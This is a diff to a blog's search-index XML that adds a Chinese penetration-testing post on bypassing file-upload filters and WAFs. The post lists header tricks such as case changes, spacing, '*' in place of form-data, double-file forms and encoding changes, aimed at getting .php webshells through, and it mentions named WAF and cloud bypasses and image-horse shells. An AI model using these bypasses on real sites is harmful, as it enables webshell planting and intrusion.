@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>上传绕过</title>
+      <link href="/2020/06/20/%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/"/>
+      <url>/2020/06/20/%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/</url>
+      
+        <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.绕过思路：对文件的内容，数据。数据包进行处理。  关键点在这里Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;ian.php&quot; 将form-data;        修改为~form-data;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2.通过替换大小写来进行绕过  Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;yjh.php&quot; Content-Type: application&#x2F;octet-stream 将Content-Disposition  修改为content-Disposition 将 form-data        修改为Form-data 将 Content-Type      修改为content-Type</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3.通过删减空格来进行绕过  Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;yjh.php&quot; Content-Type: application&#x2F;octet-stream 将Content-Disposition: form-data      冒号后面 增加或减少一个空格 将form-data; name&#x3D;&quot;file&quot;;          分号后面 增加或减少一个空格 将 Content-Type: application&#x2F;octet-stream  冒号后面 增加一个空格</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4.通过字符串拼接绕过  看Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;yjh3.php&quot; 将 form-data 修改为  f+orm-data 将 from-data 修改为  form-d+ata</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5.双文件上传绕过  &lt;form action&#x3D;&quot;https:&#x2F;&#x2F;www.xxx.com&#x2F;xxx.asp(php)&quot; method&#x3D;&quot;post&quot; name&#x3D;&quot;form1&quot; enctype&#x3D;&quot;multipart&#x2F;form‐data&quot;&gt; &lt;input name&#x3D;&quot;FileName1&quot; type&#x3D;&quot;FILE&quot; class&#x3D;&quot;tx1&quot; size&#x3D;&quot;40&quot;&gt; &lt;input name&#x3D;&quot;FileName2&quot; type&#x3D;&quot;FILE&quot; class&#x3D;&quot;tx1&quot; size&#x3D;&quot;40&quot;&gt; &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;Submit&quot; value&#x3D;&quot;上传&quot;&gt; &lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6.HTTP header 属性值绕过  Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;yjh.php&quot; 我们通过替换form-data 为*来绕过 Content-Disposition: *; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;yjh.php&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7.HTTP header 属性名称绕过  源代码: Content-Disposition: form-data; name&#x3D;&quot;image&quot;; filename&#x3D;&quot;085733uykwusqcs8vw8wky.png&quot;Content-Type: image&#x2F;png 绕过内容如下： Content-Disposition: form-data; name&#x3D;&quot;image&quot;; filename&#x3D;&quot;085733uykwusqcs8vw8wky.png C.php&quot; 删除掉ontent-Type: image&#x2F;jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php&quot;.</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8.等效替换绕过  原内容： Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------471463142114 修改后: Content-Type: multipart&#x2F;form-data; boundary &#x3D;---------------------------471463142114 boundary后面加入空格。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9.修改编码绕过  使用UTF-16、Unicode、双URL编码等等 WTS-WAF 绕过上传 原内容： Content-Disposition: form-data; name&#x3D;&quot;up_picture&quot;; filename&#x3D;&quot;xss.php&quot; 添加回车 Content-Disposition: form-data; name&#x3D;&quot;up_picture&quot;; filename&#x3D;&quot;xss.php&quot; 百度云上传绕过 百度云绕过就简单的很多很多，在对文件名大小写上面没有检测php是过了的，Php就能过，或者PHP，一句话自己合成图片马用Xise连接即可。 Content-Disposition: form-data; name&#x3D;&quot;up_picture&quot;; filename&#x3D;&quot;xss.jpg .Php&quot;</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>CSV注入漏洞基本利用</title>
       <link href="/2020/06/04/CSV%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%88%A9%E7%94%A8/"/>
       <url>/2020/06/04/CSV%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%88%A9%E7%94%A8/</url>
